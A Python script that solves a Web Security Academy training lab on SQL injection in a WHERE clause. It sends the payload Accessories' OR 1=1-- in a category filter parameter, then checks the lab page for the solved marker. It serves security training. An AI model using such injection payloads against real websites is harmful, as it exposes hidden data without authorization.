import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get('https://' + lab.id + '.web-security-academy.net/filter?category=Accessories%27+OR+1=1--')
r2 = requests.get('https://' + lab.id + '.web-security-academy.net/')
try:
    assert('<p>Solved</p>' in r2.text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.") 
